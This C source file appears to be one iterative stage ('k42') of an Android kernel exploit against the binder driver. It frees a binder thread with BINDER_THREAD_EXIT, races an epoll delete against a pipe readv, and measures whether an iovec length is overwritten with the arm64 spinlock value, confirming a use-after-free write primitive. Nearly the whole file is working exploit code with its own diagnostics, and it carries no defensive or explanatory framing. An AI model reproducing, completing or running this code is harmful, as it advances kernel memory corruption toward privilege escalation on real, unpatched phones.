/* k42: discriminate between "iov[4].len became 65537" and "it stayed 0".
 *
 * The reason every previous run could not tell them apart is arithmetic:
 * iov_length() ignores how much data sits in the pipe. total_len is simply the
 * sum of the DECLARED iov_len values, so in k40/k41
 *
 *     total = 3*4096 + 245760 + 0 + 4096 = 262144
 *
 * and the measured r was exactly 262144 - no excess at all, and only 4096 bytes
 * were ever left for iov[4]. So a meter count of 4096 was consistent with any
 * iov[4].len >= 4096, including 0 (which would skip it entirely and give the
 * bytes to iov[5]).
 *
 * The fix is to give iov[5] a large declared length, so that after iov[3] there
 * is plenty of remaining:
 *
 *     iov[0..3]  12288 + 245760            258048 consumed first
 *     iov[4]     meter, len 0                    <- the DEL is what fills this
 *     iov[5]     sink,  len 70000           70000 remaining
 *
 *   if iov[4].len == 0        -> skipped, all 70000 go to iov[5].base
 *   if iov[4].len == 65537    -> 65537 go to iov[4].base (0x00010001, the
 *                                arm64 ticket lock after lock+unlock), 4463 to
 *                                iov[5].base
 *
 * So the meter count itself names the lock word. Both buffers are ours, both
 * are counted, and a control run with the DEL skipped is included.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <errno.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/uio.h>

typedef uint64_t u64; typedef uint32_t u32; typedef int32_t s32;
typedef uint8_t u8; typedef uint16_t u16;

struct bwr_t { u64 write_size, write_consumed, write_buffer, read_size, read_consumed, read_buffer; };
struct btd_t { union { u32 handle; u64 ptr; } target; u64 cookie; u32 code; u32 flags;
               s32 sender_pid; s32 sender_euid; u64 data_size, offsets_size;
               union { struct { u64 buffer, offsets; } ptr; u8 buf[8]; } data; };
struct fbo_t { u32 type; u32 flags; union { u64 binder; u32 handle; }; u64 cookie; };

#define BINDER_WRITE_READ _IOWR('b', 1, struct bwr_t)
#define BINDER_VERSION    _IOWR('b', 9, struct { s32 protocol_version; })
#define BINDER_THREAD_EXIT _IOW('b', 8, int32_t)
#define BC_TRANSACTION _IOW('c', 0, struct btd_t)
#define BR_NOOP _IO('r', 12)
#define BR_TRANSACTION_COMPLETE _IO('r', 6)
#define BR_REPLY _IOR('r', 3, struct btd_t)
#define BR_DEAD_REPLY _IO('r', 5)
#define BR_FAILED_REPLY _IO('r', 7)
#define T_HANDLE 0x73682a85u

#define PAGE 4096
#define IOVS 32
#define BMAP_SZ (0x100000-0x2000)
#define NOISE  56
#define PRE    (3*PAGE)          /* 12288  */
#define BIGLEN (60*PAGE)         /* 245760 */
#define MTR    100               /* meter at 100..(100+MTRPAGES) */
#define MTRPAGES 40              /* 163840 bytes of measurement room */
#define SINK   160               /* iov[5].base */
#define SINKLEN 70000
#define SINKPAGES 20
#define BURST  (PRE + BIGLEN + SINKLEN)   /* 327808 written into the pipe */
#define POOLPAGES (SINK + SINKPAGES + 4)

struct shared { volatile int go, done; volatile long delok, delay, skipdel; int fd, ep, pfd; };

static u8 wbuf[8192], rbuf[8192];
static FILE *LOG;
static u8 *pool, *burst;
static struct shared *sh;
static struct iovec iovs[IOVS] __attribute__((aligned(4096)));
static int noise_fd[NOISE], nnoise;

static void say(const char *fmt, ...){
    char b[400]; va_list ap; va_start(ap, fmt);
    int n = vsnprintf(b, sizeof b, fmt, ap); va_end(ap);
    fputs(b, LOG); fflush(LOG);
}
static int bwr_fd(int fd, size_t wl, size_t rl){
    struct bwr_t b; memset(&b,0,sizeof b);
    b.write_size = wl; b.write_buffer = (u64)(uintptr_t)wbuf;
    b.read_size  = rl; b.read_buffer  = (u64)(uintptr_t)rbuf;
    int r = ioctl(fd, BINDER_WRITE_READ, &b);
    if (r < 0) return -errno;
    return (int)b.read_consumed;
}
static u8 *p32(u8 *p, u32 v){ memcpy(p,&v,4); return p+4; }
static u8 *pstr16(u8 *p, const char *s){
    size_t n = strlen(s);
    p = p32(p, (u32)n);
    for (size_t i=0;i<n;i++){ u16 c=(u16)(unsigned char)s[i]; memcpy(p,&c,2); p+=2; }
    u16 z=0; memcpy(p,&z,2); p+=2;
    while (((uintptr_t)p) & 3) *p++ = 0;
    return p;
}
static size_t mk_svc(void){
    static u8 data[512];
    u8 *d = data;
    d = p32(d, 0);
    d = pstr16(d, "android.os.IServiceManager");
    d = pstr16(d, "activity");
    u8 *p = wbuf; u32 cmd = BC_TRANSACTION; memcpy(p,&cmd,4); p += 4;
    struct btd_t t; memset(&t,0,sizeof t);
    t.target.handle = 0; t.code = 1;
    t.data_size = (u64)(d - data); t.data.ptr.buffer = (u64)(uintptr_t)data;
    memcpy(p,&t,sizeof t); p += sizeof t;
    return (size_t)(p - wbuf);
}
static size_t mk_txn(u32 handle, u32 code){
    u8 *p = wbuf; u32 cmd = BC_TRANSACTION; memcpy(p,&cmd,4); p += 4;
    struct btd_t t; memset(&t,0,sizeof t);
    t.target.handle = handle; t.code = code;
    memcpy(p,&t,sizeof t); p += sizeof t;
    return (size_t)(p - wbuf);
}
static int get_service(int fd, u32 *handle){
    size_t wl = mk_svc();
    for (int i=0;i<200;i++){
        int n = bwr_fd(fd, i==0?wl:0, 512);
        if (n <= 0){ usleep(1200); continue; }
        u8 *q = rbuf, *end = rbuf + n;
        while (q + 4 <= end){
            u32 c; memcpy(&c,q,4); q += 4;
            if (c==BR_NOOP || c==BR_TRANSACTION_COMPLETE) continue;
            if (c==BR_REPLY){
                struct btd_t *tt = (struct btd_t*)q; q += sizeof(struct btd_t);
                if (!tt->data.ptr.buffer) continue;
                struct fbo_t *o = (struct fbo_t*)(uintptr_t)tt->data.ptr.buffer;
                if (o->type == T_HANDLE){ *handle = o->handle; return 1; }
                return 0;
            }
            if (c==BR_DEAD_REPLY || c==BR_FAILED_REPLY) return -1;
            break;
        }
    }
    return 0;
}
static void flush_fd(int fd){
    for (int i = 0; i < 64; i++){
        memset(rbuf, 0, 16);
        int n = bwr_fd(fd, 0, 512);
        if (n <= 0) break;
    }
}
static int open_conn(u32 *h){
    int fd = open("/dev/binder", O_RDONLY|O_NONBLOCK);
    if (fd < 0) return -1;
    void *bm = mmap(NULL, BMAP_SZ, PROT_READ, MAP_PRIVATE|MAP_NORESERVE, fd, 0);
    if (bm == MAP_FAILED){ close(fd); return -1; }
    ioctl(fd, BINDER_VERSION, &(s32){0});
    u32 hh = 0;
    int ok = get_service(fd, &hh) > 0;
    munmap(bm, BMAP_SZ);
    if (!ok){ close(fd); return -1; }
    *h = hh;
    return fd;
}
static int arm(int fd, u32 h, int ep, int *kind_out)
{
    flush_fd(fd);
    memset(rbuf, 0, 16);
    int n = bwr_fd(fd, mk_txn(h, 0xdead), 72);
    if (n != 8) return 0;
    if ((*(u32*)rbuf & 0xff) != 0x0c) return 0;
    if ((*(u32*)(rbuf + 4) & 0xff) != 0x06) return 0;
    struct epoll_event ev; memset(&ev,0,sizeof ev); ev.events = EPOLLIN;
    if (epoll_ctl(ep, EPOLL_CTL_ADD, fd, &ev) != 0) return 0;
    struct epoll_event o; memset(&o,0,sizeof o);
    if (epoll_wait(ep, &o, 1, 0) != 0){ *kind_out = 0; return 0; }
    memset(&o,0,sizeof o);
    if (epoll_wait(ep, &o, 1, 300) == 1){ *kind_out = 1; return 1; }
    *kind_out = 2;
    return 0;
}
static void *helper(void *a){
    (void)a;
    { cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof cs,&cs); }
    for (;;){
        while (!sh->go) sched_yield();
        if (sh->delay > 0) usleep((useconds_t)sh->delay);
        if (sh->skipdel){
            sh->delok = -2;
        } else {
            struct epoll_event e2; memset(&e2,0,sizeof e2); e2.events = EPOLLIN;
            sh->delok = (epoll_ctl(sh->ep, EPOLL_CTL_DEL, sh->fd, &e2) == 0) ? 1 : 0;
        }
        { size_t off = 0;
          while (off < BURST){
              ssize_t w = write(sh->pfd, burst + off, BURST - off);
              if (w > 0){ off += (size_t)w; continue; }
              if (w < 0 && errno == EINTR) continue;
              break;
          } }
        sh->done = 1;
        while (sh->go) sched_yield();
    }
    return NULL;
}

static void run(int skipdel, const char *tag)
{
    u32 hh = 0;
    int fd = open_conn(&hh);
    if (fd < 0){ say("open_conn failed\n"); return; }
    int ep = epoll_create(1000);
    if (ep < 0){ close(fd); return; }
    int kind = -1;
    if (!arm(fd, hh, ep, &kind)){ say("%s: not armed\n", tag); close(ep); close(fd); return; }

    int pp[2]; if (pipe(pp)){ close(ep); close(fd); return; }
    fcntl(pp[1], F_SETPIPE_SZ, 1024*1024);

    memset(pool, 0x41, (size_t)POOLPAGES * PAGE);
    for (int i=0;i<3;i++){ iovs[i].iov_base = pool + (size_t)i*PAGE; iovs[i].iov_len = PAGE; }
    iovs[3].iov_base = pool + 8*PAGE;                 iovs[3].iov_len = BIGLEN;
    iovs[4].iov_base = pool + (size_t)MTR*PAGE;       iovs[4].iov_len = 0;
    iovs[5].iov_base = pool + (size_t)SINK*PAGE;      iovs[5].iov_len = SINKLEN;
    for (int i=6;i<IOVS;i++){ iovs[i].iov_base = pool + 4*PAGE; iovs[i].iov_len = 0; }

    sh->fd=fd; sh->ep=ep; sh->pfd=pp[1];
    sh->go=0; sh->done=0; sh->delok=-1; sh->delay=20; sh->skipdel=skipdel;
    s32 dummy=0;
    ioctl(fd, BINDER_THREAD_EXIT, &dummy);
    sh->go = 1;
    errno = 0;
    ssize_t r = readv(pp[0], iovs, IOVS);
    int e = errno;
    while (!sh->done) sched_yield();
    sh->go = 0;
    close(pp[0]); close(pp[1]);
    close(ep); close(fd);

    long mc = 0, sc = 0, mfirst = -1, mlast = -1;
    for (long i = 0; i < (long)MTRPAGES*PAGE; i++){
        if (pool[(size_t)MTR*PAGE + i] != 0x41){ mc++; if (mfirst<0) mfirst=i; mlast=i; }
    }
    for (long i = 0; i < (long)SINKPAGES*PAGE; i++)
        if (pool[(size_t)SINK*PAGE + i] != 0x41) sc++;

    say("%-8s kind=%d delok=%ld r=%zd e=%d  meter=%ld (span 0x%lx..0x%lx)  sink=%ld\n",
        tag, kind, sh->delok, r, e, mc,
        mfirst < 0 ? 0 : mfirst, mlast < 0 ? 0 : mlast, sc);
    say("         declared total = %d ; remaining after iov[3] = %d\n",
        PRE + BIGLEN + SINKLEN, SINKLEN);
    if (mc > 0) say("         => iov[4].len at copy time was >= %ld\n", mc);
    else        say("         => iov[4] was skipped (len was 0)\n");
}

int main(int argc, char **argv){
    int tries = (argc > 1) ? atoi(argv[1]) : 3;
    LOG = fopen("/data/local/tmp/k42.txt","w"); if (!LOG) LOG = stdout;
    setbuf(LOG, NULL);
    signal(SIGPIPE, SIG_IGN);
    { cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof cs,&cs); }
    pool  = mmap(NULL, (size_t)POOLPAGES*PAGE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    burst = mmap(NULL, BURST, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    sh    = mmap(NULL, sizeof *sh, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (pool==MAP_FAILED||burst==MAP_FAILED||sh==MAP_FAILED){ say("mmap fail\n"); return 1; }
    memset(sh, 0, sizeof *sh);
    memset(burst, 0x5a, BURST);
    say("k42 pid=%d uid=%d tries=%d BURST=%d SINKLEN=%d MTRPAGES=%d\n",
        getpid(), getuid(), tries, BURST, SINKLEN, MTRPAGES);

    pthread_t th;
    if (pthread_create(&th, NULL, helper, NULL) != 0){ say("pthread fail\n"); return 1; }
    pthread_detach(th);

    nnoise = 0;
    for (int i = 0; i < NOISE; i++){
        u32 hh = 0;
        int fd = open_conn(&hh);
        if (fd < 0) break;
        bwr_fd(fd, mk_txn(hh, 0x1000 + i), 0);
        noise_fd[nnoise++] = fd;
    }
    say("  noise pool = %d\n", nnoise);

    say("--- control: DEL skipped ---\n");
    run(1, "skipdel");
    say("--- test: DEL performed ---\n");
    for (int k = 0; k < tries; k++){
        char tag[16]; snprintf(tag, sizeof tag, "k=%d", k);
        run(0, tag);
    }
    for (int i = 0; i < nnoise; i++) close(noise_fd[i]);
    say("K42 done\n");
    return 0;
}
